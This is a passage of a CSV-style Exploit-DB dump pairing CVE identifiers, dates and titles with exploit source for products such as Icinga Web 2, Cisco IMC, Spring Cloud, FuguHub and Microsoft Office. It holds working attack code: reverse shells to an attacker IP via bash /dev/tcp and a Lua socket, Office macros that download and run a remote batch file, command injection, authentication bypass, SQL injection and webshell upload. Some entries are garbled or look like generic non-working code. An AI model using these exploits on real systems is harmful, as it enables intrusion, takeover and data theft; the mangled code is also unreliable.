{""globalshowstacktraces"":""0"", ""globalshowstacktraces"":""1"", ""globalshowapplicationstatemessages"":""0"", ""globalshowapplicationstatemessages"":""1"", ""globalmodulepath"":""/dev/shm/"", ""globalconfigresource"":""icingaweb2"", ""logginglog"":""none"", ""themesdefault"":""Icinga"", ""themesdisabled"":""0"", ""authenticationdefaultdomain"":"""", ""formUID"":""formconfiggeneral"", ""CSRFToken"":f""{csrfmodule}"", ""btnsubmit"":""Save Changes"" resul = session.post(urlmodule,datapost) urlenable = url +""/icingaweb2/config/moduleenable"" renable = session.get(urlenable) csrfenable = re.findall(r'name=""CSRFToken"" value=""([^""]*)""',renable.text)[0] dataenable = {""identifier"":f""{characterrandom}"",""CSRFToken"":f""{csrfenable}"",""btnsubmit"":""btnsubmit""} resulenable = session.post(urlenable,dataenable) def reverseshell(session,url,ipattack,portattack,characterrandom): reverseurl = url + ""/icingaweb2/dashboard"" reverseexeone = reverseurl + f'?{characterrandom}=echo+""bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ipattack}%2F{portattack}%200%3E%261""+>+/tmp/{characterrandom}' reverseexetwo = reverseurl + f""?{characterrandom}=bash+/tmp/{characterrandom} &"" reverseresponseone = session.get(reverseexeone) try: reverseresponsetwo = session.get(reverseexetwo, timeout=5) except: print(f""{Fore.RED}[*]{Style.RESETALL}Eliminating evidence"") remove = session.get(reverseurl + f""?{characterrandom}=rm+/tmp/{characterrandom}"") disableurl = url + ""/icingaweb2/config/moduledisable"" rdisable = session.get(disableurl) csrfdisable = re.findall(r'name=""CSRFToken"" value=""([^""]*)""',rdisable.text)[0] datadisable = {""identifier"":f""{characterrandom}"",""CSRFToken"":csrfdisable,""btnsubmit"":""btnsubmit""} responsedisable = session.post(disableurl,data=datadisable) def disablemodule(session,url,characterrandom): urldisable = url + ""/icingaweb2/config/moduledisable"" if name == 'main': characterrandom = letterrandom() url,user,password,ipattack,portattack = usersurlpassword() session,csrfregex = login(url,user,password) uploadfile(session,url,characterrandom,csrfregex) enablemodule(session,url,characterrandom) reverseshell(session,url,ipattack,portattack,character_random)"
CVE-2019-1937,"{""CVE-2019-1937"": 1}",2023-07-15,Cisco UCS-IMC Supervisor 2.2.0.0 - Authentication Bypass,https://www.exploit-db.com/exploits/51589,"[+] Exploit Title: Cisco UCS-IMC Supervisor 2.2.0.0 - Authentication Bypass [+] Cisco IMC Supervisor - < 2.2.1.0 [+] Date: 08/21/2019 [+] Affected Component: /app/ui/ClientServlet?apiName=GetUserInfo [+] Vendor: <URL> [+] Vulnerability Discovery : Pedro Ribeiro [+] Exploit Author: Fatih Sencer [+] CVE: CVE-2019-1937 Usage: ./python3 CiscoIMC-Bypass.py -u host [+] Target <URL> [+] Target OK [+] Exploit Succes [+] Login name : admin [+] Cookie : REACTED import argparse,requests,warnings,base64,json,random,string from requests.packages.urllib3.exceptions import InsecureRequestWarning warnings.simplefilter('ignore',InsecureRequestWarning) def init(): parser = argparse.ArgumentParser(description='Cisco IMC Supervisor / Authentication Bypass') parser.addargument('-u','--host',help='Host', type=str, required=True) args = parser.parseargs() exploit(args) def exploit(args): session = requests.Session() headers = { ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 134)"", ""X-Requested-With"": ""XMLHttpRequest"", ""Referer"": "" <URL> ""X-Starship-UserSession-Key"": ''.join(random.choices(string.asciiuppercase + string.digits, k=10)), ""X-Starship-Request-Key"": ''.join(random.choices(string.asciiuppercase + string.digits, k=10)) target = "" <URL> print(""[+] Target {}"".format(args.host)) expsend = session.get(target, headers=headers, verify=False, timeout=10) if expsend.statuscode == 200: print(""[+] Target OK"") bodydata = json.loads(expsend.text) if not (bodydata.get('loginName') is None): print(""[+] Exploit Succes"") print(""[+] Login name : {}"".format(bodydata.get('loginName') print(""[+] Cookie : {}"".format(session.cookies.getdict() else: print(""[-] Exploit Failed"") else: print(""[-] N/A"") exit() if name == ""main_"": init()"
CVE-2023-37269,"{""CVE-2023-37269"": 1}",2023-07-15,WinterCMS &lt; 1.2.3 - Persistent Cross-Site Scripting,https://www.exploit-db.com/exploits/51591,Exploit Title: WinterCMS < 1.2.3 - Persistent Cross-Site Scripting Exploit Author: abhishek morla Google Dork: N/A Date: 2023-07-10 Vendor Homepage: <URL> Software Link: <URL> Version: 1.2.2 Tested on: windows64bit / mozila firefox CVE : CVE-2023-37269 Report Link : <URL> Video
CVE-2023-36164,"{""CVE-2023-36164"": 1}",2023-07-11,MiniTool Partition Wizard ShadowMaker v.12.7 - Unquoted Service Path &quot;MTAgentService&quot;,https://www.exploit-db.com/exploits/51578,Exploit Title: MiniTool Partition Wizard ShadowMaker v.12.7 - Unquoted Service Path Date: 06/07/2023 Exploit Author: Idan Malihi Vendor Homepage: <URL> Software Link: <URL> Version: 12.7 Tested on: Microsoft Windows 10 Pro CVE : CVE-2023-36164
CVE-2023-36165,"{""CVE-2023-36165"": 1}",2023-07-11,MiniTool Partition Wizard ShadowMaker v.12.7 - Unquoted Service Path &quot;MTSchedulerService&quot;,https://www.exploit-db.com/exploits/51579,Exploit Title: MiniTool Partition Wizard ShadowMaker v.12.7 - Unquoted Service Path Date: 06/07/2023 Exploit Author: Idan Malihi Vendor Homepage: <URL> Software Link: <URL> Version: 12.7 Tested on: Microsoft Windows 10 Pro CVE : CVE-2023-36165
CVE-2023-36167,"{""CVE-2023-36167"": 1}",2023-07-11,AVG Anti Spyware 7.5 - Unquoted Service Path &quot;AVG Anti-Spyware Guard&quot;,https://www.exploit-db.com/exploits/51583,Exploit Title: AVG Anti Spyware 7.5 - Unquoted Service Path Date: 06/07/2023 Exploit Author: Idan Malihi Vendor Homepage: <URL> Software Link: <URL> Version: 7.5 Tested on: Microsoft Windows 10 Pro CVE : CVE-2023-36167
CVE-2023-36166,"{""CVE-2023-36166"": 1}",2023-07-11,Game Jackal Server v5 - Unquoted Service Path &quot;GJServiceV5&quot;,https://www.exploit-db.com/exploits/51584,Exploit Title: Game Jackal Server v5 - Unquoted Service Path Date: 06/07/2023 Exploit Author: Idan Malihi Vendor Homepage: <URL> Software Link: <URL> Version: 5 Tested on: Microsoft Windows 10 Pro CVE : CVE-2023-36166
CVE-2022-22963,"{""CVE-2022-22963"": 1}",2023-07-11,Spring Cloud 3.2.2 - Remote Command Execution (RCE),https://www.exploit-db.com/exploits/51577,"Exploit Title: Spring Cloud 3.2.2 - Remote Command Execution (RCE) Date: 07/07/2023 Exploit Author: GatoGamer1155, 0bfxgh0st Vendor Homepage: <URL> Description: Exploit to execute commands exploiting CVE-2022-22963 Software Link: <URL> CVE: CVE-2022-22963 import requests, argparse, json parser = argparse.ArgumentParser() parser.addargument(""--url"", type=str, help="" <URL> required=True) parser.addargument(""--command"", type=str, help=""ping -c1 172.17.0.1"", required=True) args = parser.parse_args() print(""\n\033[0;37m[\033[0;33m!\033[0;37m] It is possible that the output of the injected command is not reflected in the response, to validate if the server is vulnerable run a ping or curl to the attacking host\n"") headers = {""spring.cloud.function.routing-expression"": 'T(java.lang.Runtime).getRuntime().exec(""%s"")' % args.command } data = {""data"": """"} request = requests.post(args.url, data=data, headers=headers) response = json.dumps(json.loads(request.text), indent=2) print(response)"
CVE-2023-36163,"{""CVE-2023-36163"": 1}",2023-07-11,BuildaGate5library v5 - Reflected Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/51581,Exploit Title: BuildaGate5library v5 - Reflected Cross-Site Scripting (XSS) Date: 06/07/2023 Exploit Author: Idan Malihi Vendor Homepage: None Version: 5 Tested on: Microsoft Windows 10 Pro CVE : CVE-2023-36163
CVE-2023-33131,"{""CVE-2023-33131"": 1}",2023-07-07,Microsoft Outlook Microsoft 365 MSO (Version 2306 Build 16.0.16529.20100) 32-bit - Remote Code Execution,https://www.exploit-db.com/exploits/51574,"Title: Microsoft Outlook Microsoft 365 MSO (Version 2306 Build 16.0.16529.20100) 32-bit - Remote Code Execution #Author: nu11secur1ty #Date: 07.07.2023 #Vendor: <URL> #Software: <URL> #Reference: <URL> #CVE-2023-33131 #Description: In this vulnerability, the Microsoft Outlook app allows an attacker to send an infected Word file with malicious content to everyone who using the Outlook app, no matter web or local. Microsoft still doesn't have a patch against this 0-day vulnerability today. #Staus: HIGH Vulnerability [+]Exploit: - The malicious Word file: `js Sub AutoOpen() Call Shell(""cmd.exe /S /c"" & ""curl -s <URL> > nikoganqqsaopraite.bat && .\nikoganqqsaopraite.bat"", vbNormalFocus) End Sub #Reproduce: [href]( <URL> #Proof and Exploit [href]( <URL> #Time spend: 00:30:00"
CVE-2022-21907,"{""CVE-2022-21907"": 1}",2023-07-07,Windows 10 v21H1 - HTTP Protocol Stack Remote Code Execution,https://www.exploit-db.com/exploits/51575,"Title: Windows 10 v21H1 - HTTP Protocol Stack Remote Code Execution #Author: nu11secur1ty #Date: 01.14.2022 #Vendor: <URL> #Software: <URL> #Reference: <URL> #CVE-2022-21907 #Description: NOTE: After a couple of hours of tests and experiments, I found that there have been no vulnerabilities, this is just a ridiculous experiment of Microsoft. When I decided to install the IIS packages on these Windows platforms, everything was ok, and everything is patched! Windows Server 2019, Windows 10 version 1809 - 2018 year are not vulnerable by default, but after I decided to upgrade from 1909 to 2004. I found a serious problem! The Windows 10 version 2004 - 2020 year is still vulnerable to the HTTP Protocol Stack (HTTP.sys). Attack method: buffer overflow - deny of service and restart the system. This problem exists, from last year which is reported on CVE-2021-31166, and still there! On that days I have worked on it again with the help and collaboration of Axel Souchet 0vercl0k the author of the idea. On that day, I wrote an only one-line command to exploit this vulnerability! [+]Exploit: `python #!/usr/bin/python Author CVE-2022-21907 from colorama import init, Fore, Back, Style init(convert=True) import requests import time print(Fore.RED +""Please input your host.\n"") print(Style.RESETALL) print(Fore.YELLOW) host = input() print(Style.RESETALL) print(Fore.BLUE +""Sending of especially malicious crafted packages, please wait."") print(Style.RESET_ALL) time.sleep(17) print(Fore.GREEN) The"
CVE-2023-33145,"{""CVE-2023-33145"": 1}",2023-07-06,Microsoft Edge 114.0.1823.67 (64-bit) - Information Disclosure,https://www.exploit-db.com/exploits/51571,"Title:Microsoft Edge 114.0.1823.67 (64-bit) - Information Disclosure #Author: nu11secur1ty #Date: 07.06.2023 #Vendor: <URL> #Software: <URL> #Reference: <URL> <URL> #CVE-2023-33145 #Description: The type of information that could be disclosed if an attacker successfully exploited this vulnerability is data inside the targeted website like IDs, tokens, nonces, cookies, IP, User-Agent, and other sensitive information. The user would have to click on a specially crafted URL to be compromised by the attacker. In this example, the attacker use STRIDE Threat Modeling to spoof the victim to click on his website and done. This will be hard to detect. #Conclusion: Please be careful, for suspicious sites or be careful who sending you an link to open! #Staus: HIGH Vulnerability [+]Exploit: - Exploit Server: `js #This is a Get request from the server when the victims click! And it is enough to understand this vulnerability! =) #WARNING: The PoCsess.php will be not uploaded for security reasons! #BR nu11secur1ty #Reproduce: [href]( <URL> #Proof and Exploit [href]( <URL> #Time spend: 01:30:00"
CVE-2023-33592,"{""CVE-2023-33592"": 1}",2023-07-06,Lost and Found Information System v1.0 - SQL Injection,https://www.exploit-db.com/exploits/51570,"Exploit Title: Lost and Found Information System v1.0 - SQL Injection Date: 2023-06-30 country: Iran Exploit Author: Amirhossein Bahramizadeh Category : webapps Dork : /php-lfis/admin/?page=systeminfo/contactinformation Tested on: Windows/Linux CVE : CVE-2023-33592 import requests URL of the vulnerable component url = "" <URL> Injecting a SQL query to exploit the vulnerability payload = ""' OR 1=1 -- "" Send the request with the injected payload response = requests.get(url + payload) Check if the SQL injection was successful if ""admin"" in response.text: print(""SQL injection successful!"") else: print(""SQL injection failed."")"
CVE-2023-36355,"{""CVE-2023-36355"": 1}",2023-07-03,TP-Link TL-WR940N V4 - Buffer OverFlow,https://www.exploit-db.com/exploits/51561,"Exploit Title: TP-Link TL-WR940N V4 - Buffer OverFlow Date: 2023-06-30 country: Iran Exploit Author: Amirhossein Bahramizadeh Category : hardware Dork : /userRpm/WanDynamicIpV6CfgRpm Tested on: Windows/Linux CVE : CVE-2023-36355 import requests Replace the IP address with the router's IP routerip = '192.168.0.1' Construct the URL with the vulnerable endpoint and parameter url = f' <URL> Replace the payload with a crafted payload that triggers the buffer overflow payload = 'A' * 5000 Example payload, adjust the length as needed Send the GET request with the crafted payload response = requests.get(url + payload) Check the response status code if response.status_code == 200: print('Buffer overflow triggered successfully') else: print('Buffer overflow not triggered')"
CVE-2023-28285,"{""CVE-2023-28285"": 1}",2023-07-03,Microsoft 365 MSO (Version 2305 Build 16.0.16501.20074) 64-bit - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/51552,"Title: Microsoft 365 MSO (Version 2305 Build 16.0.16501.20074) 64-bit - Remote Code Execution (RCE) #Author: nu11secur1ty #Date: 04.17.2023 #Vendor: <URL> #Software: <URL> #Reference: <URL> #CVE-2023-28285 #Description: The attack itself is carried out locally by a user with authentication to the targeted system. An attacker could exploit the vulnerability by convincing a victim, through social engineering, to download and open a specially crafted file from a website which could lead to a local attack on the victim's computer. The attacker can trick the victim to open a malicious web page by using a malicious Word file for Office-365 API. After the user will open the file to read it, from the API of Office-365, without being asked what it wants to activate, etc, he will activate the code of the malicious server, which he will inject himself, from this malicious server. Emedietly after this click, the attacker can receive very sensitive information! For bank accounts, logs from some sniff attacks, tracking of all the traffic of the victim without stopping, and more malicious stuff, it depends on the scenario and etc. STATUS: HIGH Vulnerability [+]Exploit: The exploit server must be BROADCASTING at the moment when the victim hit the button of the exploit!"
CVE-2023-33137,"{""CVE-2023-33137"": 1}",2023-07-03,Microsoft 365 MSO (Version 2305 Build 16.0.16501.20074) 32-bit - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/51555,"Title:Microsoft 365 MSO (Version 2305 Build 16.0.16501.20074) 32-bit - Remote Code Execution (RCE) #Author: nu11secur1ty #Date: 06.27.2023 #Vendor: <URL> #Software: <URL> #Reference: <URL> #CVE-2023-33137 #Description: This exploit is connected with third part exploit server, which waits for the victim to call him and execute the content from him using the pipe posting method! This is absolutely a 0-day exploit! This is absolutely dangerous for the victims, who are infected by him! When the victim hit the button in the Excel file, it makes a POST request to the exploit server, and the server is responding back that way: He creates another hidden malicious file and executed it directly on the machine of the victim, then everything is disappeared, so nasty. STATUS: HIGH Vulnerability WARNING: THIS IS VERY DANGER for the usual users! [+]Exploit: `vbs Sub AutoOpen() Call Shell(""cmd.exe /S /c"" & ""curl -s <URL> > maloumnici.bat && .\maloumnici.bat"", vbNormalFocus) End Sub #Reproduce: [href]( <URL> #Proof and Exploit: [href]( <URL> #Time spend: 01:27:00"
CVE-2023-36346,"{""CVE-2023-36346"": 1}",2023-07-03,Sales of Cashier Goods v1.0 - Cross Site Scripting (XSS),https://www.exploit-db.com/exploits/51549,"Exploit Title: Sales of Cashier Goods v1.0 - Cross Site Scripting (XSS) Date: 2023-06-23 country: Iran Exploit Author: Amirhossein Bahramizadeh Category : webapps Dork : /print.php?nmmember= Vendor Homepage: <URL> Tested on: Windows/Linux CVE : CVE-2023-36346 import requests import urllib.parse Set the target URL and payload url = "" <URL> payload = "" "" Encode the payload for URL inclusion payload = urllib.parse.quote(payload) Build the request parameters params = { ""nmmember"": payload Send the request and print the response response = requests.get(url, params=params) print(response.text)"
CVE-2023-24078,"{""CVE-2023-24078"": 1}",2023-07-03,FuguHub 8.1 - Remote Code Execution,https://www.exploit-db.com/exploits/51550,"Exploit Title: FuguHub 8.1 - Remote Code Execution Date: 6/24/2023 Exploit Author: redfire359 Vendor Homepage: <URL> Software Link: <URL> Version: 8.1 Tested on: Ubuntu 22.04.1 CVE : CVE-2023-24078 import requests from bs4 import BeautifulSoup import hashlib from random import randint from urllib3 import encodemultipartformdata from urllib3.exceptions import InsecureRequestWarning import argparse from colorama import Fore requests.packages.urllib3.disablewarnings(category=InsecureRequestWarning) Options for user registration, if no user has been created yet username = 'admin' password = 'password' email = 'admin.com' parser = argparse.ArgumentParser() parser.addargument(""-r"",""--rhost"", help = ""Victims ip/url (omit the <URL> required = True) parser.addargument(""-rp"",""--rport"", help = ""http port [Default 80]"") parser.addargument(""-l"",""--lhost"", help = ""Your IP"", required = True) parser.addargument(""-p"",""--lport"", help = ""Port you have your listener on"", required = True) args = parser.parseargs() LHOST = args.lhost LPORT = args.lport url = args.rhost if args.rport != None: port = args.rport else: port = 80 def main(): checkAccount() def checkAccount(): print(f""{Fore.YELLOW}[]{Fore.WHITE} Checking for admin user."") s = requests.Session() Go to the set admin page. if page contains ""User database already saved"" then there are already admin creds and we will try to login with the creds, otherwise we will manually create an account r = s.get(f"" <URL> soup = BeautifulSoup(r.content, 'html.parser') search = soup.find('h1') if r.status_code == 404: print(Fore.RED + ""[!]"" + Fore.WHITE +"" Page not found! Check the following: \n\tTaget IP\n\tTarget Port"") exit(0) userExists = False userText = 'User database already saved' for i in search: if i.string == userText: userExists = True if userExists: print(f""{Fore.GREEN}[+]{Fore.WHITE} An admin user does exist.."") login(r,s) else: print(""{Fore.GREEN}[+]{Fore.WHITE} No admin user exists yet, creating account with {username}:{password}"") createUser(r,s) login(r,s) def createUser(r,s): data = { email : email , 'user' : username , 'password' : password , 'recoverpassword' : 'on' } r = s.post(f"" <URL> data = data) print(f""{Fore.GREEN}[+]{Fore.WHITE} User Created!"") def login(r,s): print(f""{Fore.GREEN}[+]{Fore.WHITE} Logging in."") data = {'ba_username' : username , 'ba_password' : password} r = s.post(f"" <URL> data = data, verify = False ) switching to https cause its easier to script lolz Veryify login login_Success_Title = 'Web-File-Server' soup = BeautifulSoup(r.content, 'html.parser') search = soup.find('title') for i in search: if i != login_Success_Title: print(f""{Fore.RED}[!]{Fore.WHITE} Error! We got sent back to the login page."") exit(0) print(f""{Fore.GREEN}[+]{Fore.WHITE} Success! Finding a valid file server link."") exploit(r,s) def exploit(r,s): Find the file server, default is fs r = s.get(f"" <URL> code = r.status_code if code == 404: print(f""{Fore.RED}[!]{Fore.WHITE} File server not found. "") exit(0) print(f""{Fore.GREEN}[+]{Fore.WHITE} Code: {code}, found valid file server, uploading rev shell"") Change the shell if you want to, when tested I've had the best luck with lua rev shell code so thats what I put as default shell = f'local host, port = ""{LHOST}"", {LPORT} \nlocal socket = require(""socket"")\nlocal tcp = socket.tcp() \nlocal io = require(""io"") tcp:connect(host, port); \n while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, ""r"") local s = f:read(""a"") f:close() tcp:send(s) if status == ""closed"" then break end end tcp:close()' filecontent = f' Check ur nc listener on the port you put in Wrong request method, goodBye! ' files = {'file': ('rev.lsp', filecontent, 'application/octet-stream')} r = s.post(f"" <URL> files=files) if r.text == 'ok' : print(f""{Fore.GREEN}[+]{Fore.WHITE} Successfully uploaded, calling shell "") r = s.get(f"" <URL> if name=='main': try: main() except: print(f""\n{Fore.YELLOW}[]{Fore.WHITE} Good bye!\n\n*All Hail w4rf4ther!"")"
CVE-2023-36348,"{""CVE-2023-36348"": 1}",2023-07-03,POS Codekop v2.0 - Authenticated Remote Code Execution (RCE),https://www.exploit-db.com/exploits/51551,"Exploit Title: POS Codekop v2.0 - Authenticated Remote Code Execution (RCE) Date: 25-05-2023 Exploit Author: yuyudhn Vendor Homepage: <URL> Software Link: <URL> Version: 2.0 Tested on: Linux CVE: CVE-2023-36348 Vulnerability description: The application does not sanitize the filename parameter when sending data to /fungsi/edit/edit.php?gambar=user. An attacker can exploit this issue by uploading a PHP file and accessing it, leading to Remote Code Execution. Reference: <URL> Proof of Concept: 1. Login to POS Codekop dashboard. 2. Go to profile settings. 3. Upload PHP script through Upload Profile Photo. Burp Log Example: POST /research/pos-kasir-php/fungsi/edit/edit.php?gambar=user HTTP/1.1 Host: localhost Content-Length: 8934 Cache-Control: max-age=0 sec-ch-ua: sec-ch-ua-mobile: ?0 sec-ch-ua-platform: """" Upgrade-Insecure-Requests: 1 Origin: <URL> Content-Type: multipart/form-data; boundary=-WebKitFormBoundarymVBHqH4m6KgKBnpa User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: <URL> Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=vqlfiarme77n1r4o8eh2kglfhv Connection: close -WebKitFormBoundarymVBHqH4m6KgKBnpa Content-Disposition: form-data; name=""foto""; filename=""asuka-rce.php"" Content-Type: image/jpeg ÿØÿà JFIF HHÿþ6 ÿÛC PHP Web Shell location: <URL>"
CVE-2022-4297,"{""CVE-2022-4297"": 1}",2023-07-03,WP AutoComplete 1.0.4 - Unauthenticated SQLi,https://www.exploit-db.com/exploits/51560,"Exploit Title: WP AutoComplete 1.0.4 - Unauthenticated SQLi Date: 30/06/2023 Exploit Author: Matin nouriyan (matitanium) Version: <= 1.0.4 CVE: CVE-2022-4297 Vendor Homepage: <URL> Tested on: Kali linux The WP AutoComplete Search WordPress plugin through 1.0.4 does not sanitise and escape a parameter before using it in a SQL statement via an AJAX available to unauthenticated users, leading to an unauthenticated SQL injection How to Reproduce this Vulnerability: 1. Install WP AutoComplete <= 1.0.4 2. WP AutoComplete <= 1.0.4 using q parameter for ajax requests 3. Find requests belong to WP AutoComplete like step 5 4. Start sqlmap and exploit 5. python3 sqlmap.py -u "" <URL> --random-agent --level=5 --risk=2 -p q"
CVE-2023-28293,"{""CVE-2023-28293"": 1}",2023-06-26,Windows 11 22h2 - Kernel Privilege Elevation,https://www.exploit-db.com/exploits/51544,"include include // The vulnerable driver file name const char driver_name = ""vuln_driver.sys""; const char devicename = ""\.\\VulnDriver""; define IOCTLVULNCODE 0x222003 define IOCTLBUFFERSIZE 0x1000 int main() HANDLE device; DWORD bytesreturned; char inputbuffer[IOCTLBUFFERSIZE]; char outputbuffer[IOCTLBUFFERSIZE]; if (!LoadDriver(drivername, ""\\Driver\\VulnDriver"")) printf(""Error loading vulnerable driver: %d\n"", GetLastError()); return 1; device = CreateFile(devicename, GENERICREAD | GENERICWRITE, 0, NULL, OPENEXISTING, FILEATTRIBUTENORMAL, NULL); if (device == INVALIDHANDLEVALUE) printf(""Error opening vulnerable driver device: %d\n"", GetLastError()); return 1; memset(inputbuffer, 'A', IOCTLBUFFERSIZE); if (!DeviceIoControl(device, IOCTLVULNCODE, inputbuffer, IOCTLBUFFERSIZE, outputbuffer, IOCTLBUFFERSIZE, &bytesreturned, NULL)) printf(""Error sending IOCTL: %d\n"", GetLastError()); return 1; printf(""Output buffer:\n%s\n"", outputbuffer); if (!UnloadDriver(""\\Driver\\VulnDriver"")) printf(""Error unloading vulnerable driver: %d\n"", GetLastError()); return 1; CloseHandle(device); return 0; BOOL LoadDriver(LPCTSTR drivername, LPCTSTR servicename) SCHANDLE scmanager, service; DWORD error; scmanager = OpenSCManager(NULL, NULL, SCMANAGERALLACCESS); if (scmanager == NULL) return FALSE; service = CreateService(scmanager, servicename, servicename, SERVICEALLACCESS, SERVICEKERNELDRIVER, SERVICEDEMANDSTART, SERVICEERRORNORMAL, drivername, NULL, NULL, NULL, NULL, NULL); if (service == NULL) error = GetLastError(); if (error == ERRORSERVICEEXISTS) service = OpenService(scmanager, servicename, SERVICEALLACCESS); if (service == NULL) CloseServiceHandle(scmanager); return FALSE; else CloseServiceHandle(scmanager); return FALSE; if (!StartService(service, 0, NULL)) error = GetLastError(); if (error != ERRORSERVICEALREADYRUNNING) CloseServiceHandle(service); CloseServiceHandle(scmanager); return FALSE; CloseServiceHandle(service); CloseServiceHandle(scmanager); return TRUE; BOOL UnloadDriver(LPCTSTR servicename) SCHANDLE scmanager, service; SERVICESTATUS status; DWORD error; scmanager = OpenSCManager(NULL, NULL, SCMANAGERALLACCESS); if (scmanager == NULL) return FALSE; service = OpenService(scmanager, servicename, SERVICEALLACCESS); if (service == NULL) CloseServiceHandle(scmanager); return FALSE; if (!ControlService(service, SERVICECONTROLSTOP, &status)) error = GetLastError(); if (error != ERRORSERVICENOTACTIVE) CloseServiceHandle(service); CloseServiceHandle(scmanager); return FALSE; if (!DeleteService(service)) CloseServiceHandle(service); CloseServiceHandle(scmanager); return FALSE; CloseServiceHandle(service); CloseServiceHandle(scmanager); return TRUE;"
CVE-2023-23408,"{""CVE-2023-23408"": 1}",2023-06-26,Azure Apache Ambari 2302250400 - Spoofing,https://www.exploit-db.com/exploits/51546,"Exploit Title: Azure Apache Ambari 2302250400 - Spoofing Date: 2023-06-23 country: Iran Exploit Author: Amirhossein Bahramizadeh Category : Remote Vendor Homepage: Microsoft Apache Ambari Microsoft azure Hdinsights Tested on: Windows/Linux CVE : CVE-2023-23408 import requests Set the URL and headers for the Ambari web interface url = "" <URL> headers = {""X-Requested-By"": ""ambari"", ""Authorization"": ""Basic abcdefghijklmnop""} Define a function to validate the headers def validateheaders(headers): if ""X-Requested-By"" not in headers or headers[""X-Requested-By""] != ""ambari"": return False if ""Authorization"" not in headers or headers[""Authorization""] != ""Basic abcdefghijklmnop"": return False return True Define a function to send a request to the Ambari web interface def sendrequest(url, headers): if not validateheaders(headers): print(""Invalid headers"") return response = requests.get(url, headers=headers) if response.statuscode == 200: print(""Request successful"") else: print(""Request failed"") Call the sendrequest function with the URL and headers send_request(url, headers)"
CVE-2023-28288,"{""CVE-2023-28288"": 1}",2023-06-26,Microsoft SharePoint Enterprise Server 2016 - Spoofing,https://www.exploit-db.com/exploits/51543,"include include // The vulnerable SharePoint server URL const char server_url = "" <URL> const char fakeurl = "" <URL> const char *filename = ""vulnfile.aspx""; const char *fakefilename = ""fakefile.aspx""; int main() HANDLE file; DWORD byteswritten; char filecontents[1024]; sprintf(filecontents, "" This is a fake file. ""); file = CreateFile(fakefilename, GENERICWRITE, 0, NULL, CREATEALWAYS, FILEATTRIBUTENORMAL, NULL); if (file == INVALIDHANDLEVALUE) printf(""Error creating fake file: %d\n"", GetLastError()); return 1; if (!WriteFile(file, filecontents, strlen(filecontents), &byteswritten, NULL)) printf(""Error writing fake file: %d\n"", GetLastError()); CloseHandle(file); return 1; CloseHandle(file); sprintf(filecontents, ""%s%s"", serverurl, filename); file = CreateFile(filename, GENERICWRITE, 0, NULL, CREATEALWAYS, FILEATTRIBUTENORMAL, NULL); if (file == INVALIDHANDLEVALUE) printf(""Error creating vulnerable file: %d\n"", GetLastError()); return 1; if (!InternetReadFileUrl(filecontents, file)) printf(""Error downloading vulnerable file: %d\n"", GetLastError()); CloseHandle(file); return 1; CloseHandle(file); if (!DeleteFile(filename)) printf(""Error deleting vulnerable file: %d\n"", GetLastError()); return 1; if (!MoveFile(fakefilename, filename)) printf(""Error replacing vulnerable file: %d\n"", GetLastError()); return 1; sprintf(filecontents, ""%s%s"", serverurl, filename); if (!InternetReadFileUrl(filecontents, NULL)) printf(""Error triggering vulnerability: %d\n"", GetLastError()); return 1; printf(""Vulnerability exploited successfully.\n""); return 0; BOOL InternetReadFileUrl(const char *url, HANDLE file) HINTERNET internet, connection, request; DWORD bytesread; char buffer[1024]; internet = InternetOpen(""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", INTERNETOPENTYPEPRECONFIG, NULL, NULL, 0); if (internet == NULL) return FALSE; connection = InternetConnect(internet, fakeurl, INTERNETDEFAULTHTTPPORT, NULL, NULL, INTERNETSERVICEHTTP, 0, 0); if (connection == NULL) InternetCloseHandle(internet); return FALSE; request = HttpOpenRequest(connection, ""GET"", url, NULL, NULL, NULL, 0, 0); if (request == NULL) InternetCloseHandle(connection); InternetCloseHandle(internet); return FALSE; if (!HttpSendRequest(request, NULL, 0, NULL, 0)) InternetCloseHandle(request); InternetCloseHandle(connection); InternetCloseHandle(internet); return FALSE; while (InternetReadFile(request, buffer, sizeof(buffer), &bytesread) && bytesread > 0) if (file != NULL) if (!WriteFile(file, buffer, bytesread, &bytes_read, NULL)) InternetCloseHandle(request); InternetCloseHandle(connection); InternetCloseHandle(internet); return FALSE; InternetCloseHandle(request); InternetCloseHandle(connection); InternetCloseHandle(internet); return TRUE;"
CVE-2023-30198,"{""CVE-2023-30198"": 1}",2023-06-26,PrestaShop Winbiz Payment module - Improper Limitation of a Pathname to a Restricted Directory,https://www.exploit-db.com/exploits/51545,"Exploit Title: PrestaShop Winbiz Payment module - Improper Limitation of a Pathname to a Restricted Directory Date: 2023-06-20 Dork: /modules/winbizpayment/downloads/download.php country: Iran Exploit Author: Amirhossein Bahramizadeh Category : webapps Vendor Homepage: <URL> Version: 17.1.3 (REQUIRED) Tested on: Windows/Linux CVE : CVE-2023-30198 import requests import string import random The base URL of the vulnerable site baseurl = "" <URL> The URL of the login page loginurl = baseurl + ""/authentication.php"" The username and password for the admin account username = ""admin"" password = ""password123"" The URL of the vulnerable download.php file downloadurl = baseurl + ""/modules/winbizpayment/downloads/download.php"" The ID of the order to download orderid = 1234 The path to save the downloaded file filepath = ""/tmp/order%d.pdf"" % orderid The session cookies to use for the requests sessioncookies = None Generate a random string for the CSRF token csrftoken = ''.join(random.choices(string.asciiuppercase + string.digits, k=32)) Send a POST request to the login page to authenticate as the admin user logindata = {""email"": username, ""passwd"": password, ""csrftoken"": csrftoken} session = requests.Session() response = session.post(loginurl, data=logindata) Save the session cookies for future requests sessioncookies = session.cookies.getdict() Generate a random string for the CSRF token csrftoken = ''.join(random.choices(string.asciiuppercase + string.digits, k=32)) Send a POST request to the download.php file to download the order PDF downloaddata = {""idorder"": orderid, ""csrftoken"": csrftoken} response = session.post(downloadurl, cookies=sessioncookies, data=downloaddata) Save the downloaded file to disk with open(filepath, ""wb"") as f: f.write(response.content) Print a message indicating that the file has been downloaded print(""File downloaded to %s"" % file_path)"
